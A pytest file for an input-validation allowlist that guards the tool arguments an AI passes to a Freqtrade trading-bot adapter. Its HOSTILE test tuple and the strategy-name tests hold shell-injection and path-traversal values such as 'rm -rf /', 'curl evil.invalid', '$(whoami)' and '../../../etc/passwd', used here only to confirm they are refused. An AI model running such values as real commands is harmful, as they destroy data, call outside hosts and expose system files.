"""The allowlists, which are the boundary between Claude and this machine.

Every value a tool argument can carry reaches a subprocess or a venue request.
`validate.py` is the only thing between the two, and an allowlist that quietly
stops matching is the worst kind of defect here: nothing fails, the gate just
opens.

So these tests are adversarial rather than illustrative. They push the shapes
an attacker or a confused caller would produce -- shell metacharacters, path
traversal, a market from another venue, a date before the instrument existed,
a count that would blow the compute budget -- and demand a refusal with a
reason.

**What they deliberately do not test:** that the refusal message is worded a
particular way. A test that pins prose makes the prose unchangeable; these pin
the *decision* and, where it matters, that the message names the offending
value so a caller can act on it.
"""

from __future__ import annotations

import json

import pytest

from traidingbrain.adapter.validate import (
    FEATURE_GROUPS,
    HORIZON_HOURS,
    MAX_PAIRS,
    MODELS,
    TIMEFRAMES,
    ArgumentRefusedError,
    feature_group,
    horizon,
    job_id,
    known_strategies,
    model,
    pair,
    pairs,
    strategy,
    timeframe,
    timeframes,
    timerange,
    whitelist_from_config,
)

ALLOWED = frozenset({"BTC/USDT", "ETH/USDT", "SOL/USDT"})

#: Values that must never pass any string gate. Each is a real shape: a shell
#: metacharacter, a pipe, a path traversal, a null byte, a newline that would
#: split a log line, and an argument that looks like a flag.
HOSTILE: tuple[str, ...] = (
    "BTC/USDT; rm -rf /",
    "BTC/USDT && curl evil.invalid",
    "BTC/USDT | tee /etc/passwd",
    "../../../etc/passwd",
    "BTC/USDT\x00",
    "BTC/USDT\nETH/USDT",
    "--userdir=/",
    "$(whoami)",
    "`id`",
    "BTC/USDT'",
)


# --------------------------------------------------------------------------- #
# Markets
# --------------------------------------------------------------------------- #


def test_a_configured_market_passes_and_is_normalised() -> None:
    assert pair("btc/usdt", allowed=ALLOWED) == "BTC/USDT"
    assert pair("  ETH/USDT  ", allowed=ALLOWED) == "ETH/USDT"


def test_a_market_from_another_venue_is_refused() -> None:
    """Spelling alone is not enough: it must be one this project configured."""
    with pytest.raises(ArgumentRefusedError, match="Whitelist"):
        pair("DOGE/USDT", allowed=ALLOWED)


@pytest.mark.parametrize("hostile", HOSTILE)
def test_no_hostile_market_string_passes(hostile: str) -> None:
    """The gate is an allowlist, so none of these can get through.

    Passing a list to subprocess stops shell injection; it does nothing about
    an argument that names a market nobody configured or a path outside the
    project. That is what this checks.
    """
    with pytest.raises(ArgumentRefusedError):
        pair(hostile, allowed=ALLOWED)


def test_a_non_string_market_is_refused_by_type() -> None:
    for bad in (None, 42, ["BTC/USDT"], {"pair": "BTC/USDT"}):
        with pytest.raises(ArgumentRefusedError, match="Text"):
            pair(bad, allowed=ALLOWED)  # type: ignore[arg-type]


def test_an_empty_market_list_means_all_configured() -> None:
    """The useful default: a caller should not have to restate the whitelist."""
    assert pairs(None, allowed=ALLOWED) == sorted(ALLOWED)
    assert pairs([], allowed=ALLOWED) == sorted(ALLOWED)


def test_markets_are_deduplicated_with_order_kept() -> None:
    got = pairs(["ETH/USDT", "btc/usdt", "ETH/USDT"], allowed=ALLOWED)
    assert got == ["ETH/USDT", "BTC/USDT"]


def test_too_many_markets_is_refused_before_anything_runs() -> None:
    """The compute budget is a limit, so it is enforced at the gate.

    A request for a hundred markets is not malicious and is still a request to
    occupy the machine for a day. Refusing it here costs nothing; discovering
    it after four hours costs four hours.
    """
    too_many = [f"X{i}/USDT" for i in range(MAX_PAIRS + 1)]
    with pytest.raises(ArgumentRefusedError, match="Hoechstens"):
        pairs(too_many, allowed=ALLOWED)


def test_one_bad_market_refuses_the_whole_list() -> None:
    """No partial acceptance: a caller asking for four must get four or an error."""
    with pytest.raises(ArgumentRefusedError, match="Whitelist"):
        pairs(["BTC/USDT", "DOGE/USDT"], allowed=ALLOWED)


# --------------------------------------------------------------------------- #
# Timeframes and date windows
# --------------------------------------------------------------------------- #


def test_known_timeframes_pass_and_others_do_not() -> None:
    for good in TIMEFRAMES:
        assert timeframe(good) == good
    for bad in ("7m", "1s", "2h", "M15", "1H", "", "5m "):
        with pytest.raises(ArgumentRefusedError, match="Zeitebene"):
            timeframe(bad)


def test_timeframes_default_and_deduplicate() -> None:
    assert timeframes(None, default=["5m", "1h"]) == ["5m", "1h"]
    assert timeframes(["1h", "5m", "1h"], default=["5m"]) == ["1h", "5m"]


def test_a_valid_timerange_passes_in_all_three_shapes() -> None:
    assert timerange("20250301-20261001") == "20250301-20261001"
    assert timerange("20250301-") == "20250301-"
    assert timerange("-20261001") == "-20261001"
    assert timerange(None) is None
    assert timerange("") is None


def test_a_date_that_looks_right_but_is_not_a_date_is_refused() -> None:
    """The regex accepts 20250231; only strptime settles it.

    This matters because the alternative is a job that runs for minutes and
    then dies on an argument Freqtrade rejects.
    """
    with pytest.raises(ArgumentRefusedError, match="gueltiges Datum"):
        timerange("20250231-20261001")
    with pytest.raises(ArgumentRefusedError, match="gueltiges Datum"):
        timerange("20251301-")


def test_a_date_before_the_instrument_existed_is_refused() -> None:
    with pytest.raises(ArgumentRefusedError, match="liegt vor"):
        timerange("19990101-20261001")


def test_a_backwards_timerange_is_refused() -> None:
    with pytest.raises(ArgumentRefusedError, match="rueckwaerts"):
        timerange("20261001-20250301")


def test_a_timerange_equal_on_both_sides_is_refused() -> None:
    """An empty window is a mistake, not a request for no data."""
    with pytest.raises(ArgumentRefusedError, match="rueckwaerts"):
        timerange("20250301-20250301")


@pytest.mark.parametrize("hostile", HOSTILE)
def test_no_hostile_string_passes_as_a_timerange(hostile: str) -> None:
    with pytest.raises(ArgumentRefusedError):
        timerange(hostile)


# --------------------------------------------------------------------------- #
# Strategies: the argument that must never become a path
# --------------------------------------------------------------------------- #


def test_a_strategy_must_exist_as_a_file_in_the_directory(tmp_path) -> None:
    (tmp_path / "Mine.py").write_text("x = 1", encoding="utf-8")
    assert strategy("Mine", directory=tmp_path) == "Mine"

    with pytest.raises(ArgumentRefusedError, match="gibt es nicht"):
        strategy("Absent", directory=tmp_path)


def test_a_strategy_name_never_becomes_a_path(tmp_path) -> None:
    """The check that makes --strategy incapable of pointing elsewhere.

    The name is only ever compared against names found by scanning one
    directory. It is never joined to a path, so traversal has nothing to
    traverse -- and these shapes fail the class-name regex first anyway.
    """
    (tmp_path / "Mine.py").write_text("x = 1", encoding="utf-8")
    outside = tmp_path.parent / "Evil.py"
    outside.write_text("x = 1", encoding="utf-8")

    for bad in ("../Evil", "..\\Evil", "/etc/passwd", "Mine;id", "Mine.py", *HOSTILE):
        with pytest.raises(ArgumentRefusedError):
            strategy(bad, directory=tmp_path)


def test_private_and_dunder_files_are_not_offered(tmp_path) -> None:
    (tmp_path / "__init__.py").write_text("", encoding="utf-8")
    (tmp_path / "_helper.py").write_text("", encoding="utf-8")
    (tmp_path / "Real.py").write_text("", encoding="utf-8")
    assert known_strategies(tmp_path) == frozenset({"Real"})


def test_a_missing_strategy_directory_offers_nothing(tmp_path) -> None:
    assert known_strategies(tmp_path / "absent") == frozenset()


def test_subdirectories_are_not_scanned(tmp_path) -> None:
    """Non-recursive on purpose: Freqtrade resolves by scanning one directory."""
    nested = tmp_path / "deeper"
    nested.mkdir()
    (nested / "Hidden.py").write_text("", encoding="utf-8")
    assert known_strategies(tmp_path) == frozenset()


# --------------------------------------------------------------------------- #
# The research series: declared values only
# --------------------------------------------------------------------------- #


def test_only_the_declared_horizons_are_accepted() -> None:
    """A fourth horizon cannot be slipped in and then compared against three.

    The whole point of declaring 24, 72 and 168 in advance is that the
    comparison is between things that were named before any result was seen.
    """
    for good in HORIZON_HOURS:
        assert horizon(good) == good
    for bad in (1, 12, 48, 96, 169, 0, -24):
        with pytest.raises(ArgumentRefusedError, match="nicht angemeldet"):
            horizon(bad)


def test_only_the_declared_feature_groups_are_accepted() -> None:
    for good in FEATURE_GROUPS:
        assert feature_group(good) == good
    for bad in ("P+X", "p", "", "P+D+M+O+Q", "D"):
        with pytest.raises(ArgumentRefusedError, match="nicht angemeldet"):
            feature_group(bad)


def test_only_the_permitted_models_are_accepted() -> None:
    """No deep learning this round, which the order fixes and this enforces."""
    for good in MODELS:
        assert model(good) == good
    for bad in ("transformer", "lstm", "rl", "LightGBM", ""):
        with pytest.raises(ArgumentRefusedError, match="nicht zugelassen"):
            model(bad)


# --------------------------------------------------------------------------- #
# Job identifiers, which are used to read a log
# --------------------------------------------------------------------------- #


def test_a_job_id_must_look_like_one_this_adapter_issued() -> None:
    assert job_id("backtest-0123456789ab") == "backtest-0123456789ab"
    for bad in (
        "../../etc/passwd",
        "backtest-../../x",
        "backtest-SHORT",
        "backtest-0123456789abcdef",
        "BACKTEST-0123456789ab",
        "0123456789ab",
        "backtest-0123456789aG",
        "",
    ):
        with pytest.raises(ArgumentRefusedError, match="Job-Kennung"):
            job_id(bad)


# --------------------------------------------------------------------------- #
# The whitelist is read from configuration, not taken as an argument
# --------------------------------------------------------------------------- #


def test_the_whitelist_comes_from_the_config_with_later_files_winning(
    tmp_path,
) -> None:
    """Freqtrade's own merge order, so the gate and the bot cannot disagree."""
    first = tmp_path / "base.json"
    first.write_text(
        json.dumps({"exchange": {"pair_whitelist": ["BTC/USDT"]}}), encoding="utf-8"
    )
    second = tmp_path / "local.json"
    second.write_text(
        json.dumps({"exchange": {"pair_whitelist": ["ETH/USDT", "sol/usdt"]}}),
        encoding="utf-8",
    )
    assert whitelist_from_config(first, second) == frozenset({"ETH/USDT", "SOL/USDT"})


def test_a_config_without_a_whitelist_is_refused(tmp_path) -> None:
    empty = tmp_path / "base.json"
    empty.write_text(json.dumps({"exchange": {}}), encoding="utf-8")
    with pytest.raises(ArgumentRefusedError, match="pair_whitelist"):
        whitelist_from_config(empty)


def test_unreadable_config_names_the_file(tmp_path) -> None:
    broken = tmp_path / "base.json"
    broken.write_text("{not json", encoding="utf-8")
    with pytest.raises(ArgumentRefusedError, match=r"base\.json"):
        whitelist_from_config(broken)


def test_a_missing_config_file_is_skipped_not_fatal(tmp_path) -> None:
    """The secrets file may legitimately be absent while the base one is not."""
    present = tmp_path / "base.json"
    present.write_text(
        json.dumps({"exchange": {"pair_whitelist": ["BTC/USDT"]}}), encoding="utf-8"
    )
    assert whitelist_from_config(tmp_path / "absent.json", present) == frozenset({"BTC/USDT"})


def test_refusal_is_a_value_error_so_callers_can_catch_it_broadly() -> None:
    assert issubclass(ArgumentRefusedError, ValueError)
